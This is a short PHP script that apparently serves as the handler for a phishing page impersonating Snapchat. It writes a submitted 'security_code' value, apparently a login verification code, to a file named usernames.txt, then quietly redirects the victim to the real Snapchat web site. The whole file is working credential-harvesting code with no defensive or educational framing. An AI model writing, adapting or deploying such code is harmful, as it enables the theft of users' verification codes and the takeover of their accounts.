<?php

file_put_contents("usernames.txt", " Security Code: " . $_POST['security_code'] . "\n", FILE_APPEND);
header('Location: https://web.snapchat.com/');
exit();
?>